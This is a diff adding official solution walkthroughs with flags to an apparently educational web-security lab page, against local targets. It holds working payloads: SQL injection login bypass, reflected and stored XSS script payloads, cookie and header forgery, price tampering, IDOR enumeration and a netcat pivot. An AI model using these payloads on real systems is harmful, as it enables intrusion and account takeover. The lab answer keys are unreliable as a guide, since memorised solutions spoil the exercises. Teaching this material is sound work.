+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Perform a multi-hop lateral network pivot across internal loopback aliases (127.0.0.2 -> 127.0.0.3 -> 127.0.0.4), piping authentication tokens between gateways to reach the isolated vault.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Connect to the initial entrypoint host at <code>127.0.0.2:5000</code>: <code>nc 127.0.0.2 5000</code>.</li><li>Note the returned message: <code>recon host. next hop: 127.0.0.3 port &lt;PORTB&gt; passphrase: &lt;PASS&gt;</code> (e.g. port 6841, passphrase <code>kx9qfa</code>).</li><li>Connect to the second hop gateway at <code>127.0.0.3:&lt;PORTB&gt;</code> and transmit the passphrase: <code>printf "&lt;PASS&gt;\n" | nc 127.0.0.3 &lt;PORTB&gt;</code>.</li><li>Read the response: <code>accepted. final host: 127.0.0.4 port &lt;PORTC&gt;</code> (e.g. port 9245).</li><li>Connect to the final vault destination: <code>nc 127.0.0.4 &lt;PORTC&gt;</code>.</li><li>The vault emits: <code>vault. key: BK{subn3t_p1v0t_4ch13v3d_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>nc 127.0.0.2 5000</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>nc</code>: Netcat connecting to the first hop entrypoint.</li><li><code>127.0.0.2</code>: First hop IP address.</li><li><code>5000</code>: First hop listening port.</li>
+      </ul>
+    </div>
+  
+    <pre><code>printf "kx9qfa\n" | nc 127.0.0.3 6841</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>printf</code>: Formats and prints string with exact newline character (\n).</li><li><code>|</code>: Pipes the passphrase directly into the established network socket.</li><li><code>127.0.0.3</code>: Second hop gateway IP address.</li><li><code>6841</code>: Second hop port revealed by hop 1.</li>
+      </ul>
+    </div>
+  
+    <pre><code>nc 127.0.0.4 9245</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>127.0.0.4</code>: Final isolated vault destination IP.</li><li><code>9245</code>: Final vault port revealed by hop 2.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-pivot:~$ nc 127.0.0.2 5000
+recon host.
+next hop: 127.0.0.3 port 6841
+passphrase: kx9qfa
+student@signals-pivot:~$ printf "kx9qfa\n" | nc 127.0.0.3 6841
+accepted. final host: 127.0.0.4 port 9245
+student@signals-pivot:~$ nc 127.0.0.4 9245
+vault. key: BK{subn3t_p1v0t_4ch13v3d_3d2c1b0a9f8e7d6c}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the final vault key: <code>BK{subn3t_p1v0t_4ch13v3d_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1119,6 +1649,49 @@ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:8080/FUZZ
 curl -I http://127.0.0.1:8080/.env</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Inspect crawler directives in /robots.txt to discover hidden backup directories and extract the flag from /keep-backup.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Request the standard web crawler exclusions file: <code>curl -s http://localhost:8080/robots.txt</code>.</li><li>Notice the disallowed administrative directories: <code>/portal-8f2c/</code>, <code>/keep-backup/</code>, and <code>/keep-admin/</code>.</li><li>Query the exposed backup directory: <code>curl -s http://localhost:8080/keep-backup</code>.</li><li>The server returns the backup index along with the authentic flag.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -s http://localhost:8080/robots.txt</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>curl</code>: Command-line tool for transferring data with URL syntax.</li><li><code>-s</code>: Silent mode. Suppresses curl download progress indicators and connection statistics.</li><li><code>http://localhost:8080/robots.txt</code>: Target URL requesting the robots exclusion standard file.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl -s http://localhost:8080/keep-backup</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>http://localhost:8080/keep-backup</code>: Target endpoint discovered from the robots.txt disallowed paths.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -s http://localhost:8080/robots.txt
+User-agent: *
+Disallow: /portal-8f2c/
+Disallow: /keep-backup/
+Disallow: /keep-admin/
+student@tradingpost:~$ curl -s http://localhost:8080/keep-backup
+internal backup index
+(nothing sensitive here except this) BK{d1r_bust3r_3num_1b2c3d4e5f6a7b8c}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token starting with <code>BK{d1r_bust3r_3num_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -1172,6 +1745,51 @@ curl -I http://127.0.0.1:8080/.env</code></pre>
             <li><strong>Console Tab:</strong> Directly query and inspect global JavaScript objects and API state (e.g., typing <code>window.__APP_STATE__</code>).</li>
           </ul>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Inspect HTTP response headers on /account using curl -i (or browser DevTools Network tab), locate the custom X-Keep-Token header, and Base64-decode the token.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Request the <code>/account</code> endpoint including HTTP response headers: <code>curl -i http://localhost:8080/account</code>.</li><li>The response body contains only generic text (<code>Account OK. Your session token is returned in the response headers...</code>).</li><li>Inspect the HTTP response headers above the body to locate: <code>X-Keep-Token: &lt;BASE64_STRING&gt;</code>.</li><li>Decode the Base64 token value using the terminal: <code>echo "&lt;BASE64_STRING&gt;" | base64 -d</code>.</li><li>The decoded output yields the authentic flag.</li><li>Submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -i http://localhost:8080/account</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-i</code>: Include headers. Tells curl to print the HTTP protocol status line and all response headers (e.g. X-Keep-Token, Content-Type) directly preceding the body. Without -i, headers are invisible in curl!</li><li><code>http://localhost:8080/account</code>: Account status endpoint.</li>
+      </ul>
+    </div>
+  
+    <pre><code>echo "Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=" | base64 -d</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>echo</code>: Outputs the extracted Base64 token string.</li><li><code>base64 -d</code>: Decodes Base64 data back to plaintext ASCII.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -i http://localhost:8080/account
+HTTP/1.1 200 OK
+X-Powered-By: Express
+X-Keep-Token: Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=
+Content-Type: text/plain; charset=utf-8
+Content-Length: 75
+
+Account OK. Your session token is returned in the response headers...
+student@tradingpost:~$ echo "Qkt7YzBuczBsM19oNGNrM3JfNDFhMmI0YzZkOGUwZjEyM30=" | base64 -d
+BK{c0ns0l3_h4ck3r_41a2b4c6d8e0f123}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the decoded token: <code>BK{c0ns0l3_h4ck3r_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1234,6 +1852,49 @@ curl -H "Cookie: role=admin; verified=true" http://127.0.0.1:8080/dashboard
 echo "eyJyb2xlIjoidXNlciJ9" | base64 -d</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Bypass broken access control on /vault by tampering with the client-side role cookie, elevating privilege to role=admin.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Query <code>/vault</code> normally: <code>curl -i http://localhost:8080/vault</code>.</li><li>Notice the <code>403 Forbidden</code> response: <code>Members only. (role cookie = user)</code>.</li><li>Replay the request injecting the forged administrative cookie: <code>curl --cookie "role=admin" http://localhost:8080/vault</code>.</li><li>Alternatively in the browser web app: Open DevTools Console (F12) on the web app tab, execute <code>document.cookie = "role=admin"; location.href = "vault";</code>.</li><li>The server validates <code>req.cookies.role === 'admin'</code> and returns <code>Welcome, warden. BK{c00k13_m0d1f13r_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -i http://localhost:8080/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-i</code>: Prints HTTP response status line (403 Forbidden) and headers.</li><li><code>http://localhost:8080/vault</code>: Restricted vault endpoint.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl --cookie "role=admin" http://localhost:8080/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>--cookie "role=admin"</code>: Injects a Cookie: role=admin header into the outbound HTTP request, forging client-side authorization state.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -i http://localhost:8080/vault
+HTTP/1.1 403 Forbidden
+Content-Type: text/html; charset=utf-8
+Content-Length: 38
+
+Members only. (role cookie = user)
+student@tradingpost:~$ curl --cookie "role=admin" http://localhost:8080/vault
+Welcome, warden. BK{c00k13_m0d1f13r_5e6f7a8b9c0d1e2f}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the key: <code>BK{c00k13_m0d1f13r_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -1290,6 +1951,35 @@ curl -X POST http://127.0.0.1:8080/api/purchase \
   -H "Content-Type: application/json" \
   -d '{"itemId": 42, "quantity": -10, "discountCode": "FREE99"}'</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Exploit client-side price trust by submitting a modified checkout request with price=0 to purchase the Grand Citadel Flag Key for free.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the storefront catalog in your browser at <code>http://localhost:8080/</code>. Notice the *Grand Citadel Flag Key* costs 9,999 gold and clicking purchase fails with insufficient funds.</li><li><strong>Browser DOM Method:</strong> Right-click the Purchase button, select Inspect (DevTools Elements tab). Locate <code>&lt;input type="hidden" name="price" value="9999"&gt;</code>. Double click and change <code>value="0"</code> directly in the DOM, then click Purchase.</li><li><strong>Terminal / curl Method:</strong> Submit an HTTP POST request directly to <code>/checkout</code> overriding the price parameter: <code>curl -X POST -d "price=0" http://localhost:8080/checkout</code>.</li><li>The server accepts the zero-dollar order and responds: <code>Free order accepted. BK{cl13nt_s1d3_byp4ss_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -X POST -d "price=0" http://localhost:8080/checkout</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-X POST</code>: Changes the HTTP request method to POST, transmitting form data to the server.</li><li><code>-d "price=0"</code>: Data payload flag. Sends price=0 in the POST request body with Content-Type: application/x-www-form-urlencoded.</li><li><code>http://localhost:8080/checkout</code>: Target checkout processing endpoint.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -X POST -d "price=0" http://localhost:8080/checkout
+Free order accepted. BK{cl13nt_s1d3_byp4ss_7a8b9c0d1e2f3a4b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{cl13nt_s1d3_byp4ss_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1351,6 +2041,45 @@ curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1042
 curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1043
 curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Exploit an Insecure Direct Object Reference on /order?id=<id> by enumerating numeric IDs to access the administrator's secret order (ID 1337).</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Query the default user order: <code>curl "http://localhost:8080/order?id=1042"</code>.</li><li>The application displays: <code>Order 1042: Widget — nothing here</code>.</li><li>Notice that the <code>id</code> parameter is a predictable numeric identifier passed directly into the SQL query without user ownership verification.</li><li>Enumerate or test standard privileged identifier <code>1337</code>: <code>curl "http://localhost:8080/order?id=1337"</code>.</li><li>The server returns the administrator's secret order: <code>Order 1337: Vault Key — BK{1d0r_p4r4m_t4mp3r_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl "http://localhost:8080/order?id=1042"</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>curl</code>: Fetches the order endpoint.</li><li><code>?id=1042</code>: URL query parameter specifying the order database record ID.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl "http://localhost:8080/order?id=1337"</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>?id=1337</code>: Enumerated administrative order ID.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl "http://localhost:8080/order?id=1042"
+Order 1042: Widget — nothing here
+student@tradingpost:~$ curl "http://localhost:8080/order?id=1337"
+Order 1337: Vault Key — BK{1d0r_p4r4m_t4mp3r_3f2e1d0c9b8a7f6e}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the revealed key: <code>BK{1d0r_p4r4m_t4mp3r_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1424,6 +2153,35 @@ const sql = "SELECT * FROM users WHERE username = '" + req.body.user + "' AND pa
           </ul>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Bypass authentication on /portal-8f2c/login using an SQL injection syntax break and line comment (admin'--).</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Identify the administrative login endpoint from robots.txt: <code>/portal-8f2c/login</code>.</li><li>Craft an SQL injection payload that escapes the single-quoted string literal and comments out the password clause: <code>username = admin'--</code>.</li><li>Submit the exploit payload via HTTP POST: <code>curl -X POST --data-urlencode "username=admin'--" -d "password=x" http://localhost:8080/portal-8f2c/login</code>.</li><li>Alternatively, use boolean tautology: <code>curl -X POST --data-urlencode "username=' OR '1'='1" -d "password=x" http://localhost:8080/portal-8f2c/login</code>.</li><li>The database evaluates <code>SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'</code>, logging in as admin and returning the flag.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -X POST --data-urlencode "username=admin'--" -d "password=x" http://localhost:8080/portal-8f2c/login</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-X POST</code>: Sends an HTTP POST request.</li><li><code>--data-urlencode "username=admin'--"</code>: URL-encodes the injection string (encoding single quotes and hyphens) so the server parser interprets the raw characters cleanly.</li><li><code>' (single quote)</code>: Terminates the SQL string literal boundary.</li><li><code>-- (SQL comment)</code>: Instructs the SQLite engine to treat the remainder of the SQL query line (including AND password = ...) as a non-executable comment.</li><li><code>-d "password=x"</code>: Supplies an arbitrary dummy password.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -X POST --data-urlencode "username=admin'--" -d "password=x" http://localhost:8080/portal-8f2c/login
+Logged in as admin. BK{un10n_s3l3ct_byp4ss_8a7b6c5d4e3f2a1b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{un10n_s3l3ct_byp4ss_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -1484,6 +2242,43 @@ http://127.0.0.1:8080/search?q=&lt;script&gt;alert(document.domain)&lt;/script&g
 # Step 3: Test HTML event handlers:
 http://127.0.0.1:8080/search?q=&lt;img src=x onerror=alert(1)&gt;</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Exploit unescaped input reflection on /search?q=<payload> to execute browser JavaScript that reports the in-memory window.KEEP_NONCE to /xss-report.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the web application in your browser via the "Open web app" button.</li><li>Notice that entering text into the search box reflects the query directly into the HTML without output encoding.</li><li>Construct an XSS payload that reads the session nonce and performs an asynchronous GET callback: <code>&lt;script&gt;fetch('/xss-report?r=reflected-xss&nonce='+window.KEEP_NONCE)&lt;/script&gt;</code>.</li><li>Navigate to the crafted search URL in your browser: <code>http://localhost:8080/search?q=&lt;script&gt;fetch('/xss-report?r=reflected-xss&nonce='+window.KEEP_NONCE)&lt;/script&gt;</code>.</li><li>The browser executes the injected script, triggering the callback to <code>/xss-report</code>.</li><li>Check the challenge completion status endpoint via curl or browser: <code>curl "http://localhost:8080/xss-status?r=reflected-xss"</code>.</li><li>The server verifies valid execution and outputs the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>http://localhost:8080/search?q=<script>fetch('/xss-report?r=reflected-xss&nonce='+window.KEEP_NONCE)</script></code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code><script>...</script></code>: Injects an active JavaScript execution block directly into the Document Object Model (DOM).</li><li><code>window.KEEP_NONCE</code>: In-page verification token embedded in the DOM to confirm authentic client execution.</li><li><code>fetch(...)</code>: Browser Web API making an asynchronous HTTP request to report successful script execution.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl "http://localhost:8080/xss-status?r=reflected-xss"</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>curl</code>: Queries the room status endpoint to retrieve the reward flag once execution is validated.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl "http://localhost:8080/xss-status?r=reflected-xss"
+solved. BK{xss_scr1pt_4l3rt_2b3c4d5e6f7a8b9c}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{xss_scr1pt_4l3rt_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1572,6 +2367,49 @@ curl -I http://127.0.0.1:8080/
 curl -s -I http://127.0.0.1:8080/ | grep -Ei "frame|csp|content-security"</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Bypass access control on /admin-panel by injecting the required custom request header X-Keep-Role: admin.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Query the administrative panel: <code>curl -i http://localhost:8080/admin-panel</code>.</li><li>Observe the <code>403 Forbidden</code> response: <code>forbidden: this panel requires the header  X-Keep-Role: admin</code>.</li><li>Resubmit the request supplying the required custom header: <code>curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel</code>.</li><li>The server validates <code>req.headers['x-keep-role'] === 'admin'</code> and returns <code>admin panel unlocked. BK{c0rs_h34d3r_sp00f_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -i http://localhost:8080/admin-panel</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-i</code>: Includes HTTP response status line and headers.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-H "X-Keep-Role: admin"</code>: Custom header flag. Injects the specified header into the outbound HTTP request.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -i http://localhost:8080/admin-panel
+HTTP/1.1 403 Forbidden
+Content-Type: text/plain; charset=utf-8
+Content-Length: 69
+
+forbidden: this panel requires the header  X-Keep-Role: admin
+student@tradingpost:~$ curl -H "X-Keep-Role: admin" http://localhost:8080/admin-panel
+admin panel unlocked. BK{c0rs_h34d3r_sp00f_1f2e3d4c5b6a7980}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{c0rs_h34d3r_sp00f_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -1629,6 +2467,46 @@ app.use(helmet());</code></pre>
             <li>Reload the page (or log in with a second user account) to observe whether the HTML rendered executed the probe.</li>
           </ul>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Inject a persistent malicious script into /guestbook via HTTP POST, trigger execution by viewing /guestbook in the browser, and retrieve the flag.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Submit a stored XSS payload into the guestbook via HTTP POST: <code>curl -X POST -d "comment=&lt;script&gt;fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)&lt;/script&gt;" http://localhost:8080/guestbook</code>.</li><li>Open the web application in your browser and navigate to the guestbook page at <code>http://localhost:8080/guestbook</code>.</li><li>The browser renders the stored comment from the server, evaluates the unescaped <code>&lt;script&gt;</code> tag, and sends the callback request with <code>window.KEEP_NONCE</code>.</li><li>Check the completion status: <code>curl "http://localhost:8080/xss-status?r=stored-xss"</code>.</li><li>The server outputs: <code>solved. BK{p3rs1st3nt_p4yl04d_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -X POST -d "comment=<script>fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)</script>" http://localhost:8080/guestbook</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-X POST</code>: Transmits an HTTP POST request to store the comment.</li><li><code>-d "comment=..."</code>: Sends the persistent XSS payload as form-encoded data.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl "http://localhost:8080/xss-status?r=stored-xss"</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>curl</code>: Checks the status endpoint once the script executes in the browser.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -X POST -d "comment=<script>fetch('/xss-report?r=stored-xss&nonce='+window.KEEP_NONCE)</script>" http://localhost:8080/guestbook
+Found. Redirecting to guestbook
+# Student opens http://localhost:8080/guestbook in the browser
+student@tradingpost:~$ curl "http://localhost:8080/xss-status?r=stored-xss"
+solved. BK{p3rs1st3nt_p4yl04d_9a8b7c6d5e4f3a2b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{p3rs1st3nt_p4yl04d_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1698,6 +2576,62 @@ app.use(helmet());</code></pre>
             <li>Combine access control oversights with authentication bypasses to escalate privilege.</li>
           </ul>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Chain endpoint discovery from robots.txt with cookie tampering to access the hidden administrative vault at /keep-admin/vault.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Reconnaissance: Query <code>robots.txt</code> using <code>curl -s http://localhost:8080/robots.txt</code> to reveal <code>Disallow: /keep-admin/</code>.</li><li>Probe the hidden administrative path: <code>curl -i http://localhost:8080/keep-admin/vault</code>.</li><li>Notice the <code>403 Forbidden</code> response: <code>forbidden: admin only (how did the vault room get in?)</code>.</li><li>Chain the vulnerability by injecting the forged administrative cookie into the hidden endpoint: <code>curl --cookie "role=admin" http://localhost:8080/keep-admin/vault</code>.</li><li>The server validates both the route and the cookie, returning: <code>chained to the inner vault. BK{full_ch41n_3xpl01t_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -s http://localhost:8080/robots.txt</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>robots.txt</code>: Discovers undisclosed administrative routing endpoints.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl -i http://localhost:8080/keep-admin/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-i</code>: Verifies the 403 Forbidden status on the hidden path.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl --cookie "role=admin" http://localhost:8080/keep-admin/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>--cookie "role=admin"</code>: Supplies the elevated role cookie to bypass the access control gate.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@tradingpost:~$ curl -s http://localhost:8080/robots.txt
+User-agent: *
+Disallow: /portal-8f2c/
+Disallow: /keep-backup/
+Disallow: /keep-admin/
+student@tradingpost:~$ curl -i http://localhost:8080/keep-admin/vault
+HTTP/1.1 403 Forbidden
+Content-Type: text/plain; charset=utf-8
+Content-Length: 53
+
+forbidden: admin only (how did the vault room get in?)
+student@tradingpost:~$ curl --cookie "role=admin" http://localhost:8080/keep-admin/vault
+chained to the inner vault. BK{full_ch41n_3xpl01t_4a5b6c7d8e9f0a1b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token: <code>BK{full_ch41n_3xpl01t_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1799,6 +2733,48 @@ app.get('/api/search', (req, res) => {
 });</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Fix SQL injection on /portal-8f2c/login in /app/server.js using parameterized queries / prepared statements with placeholder bindings.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
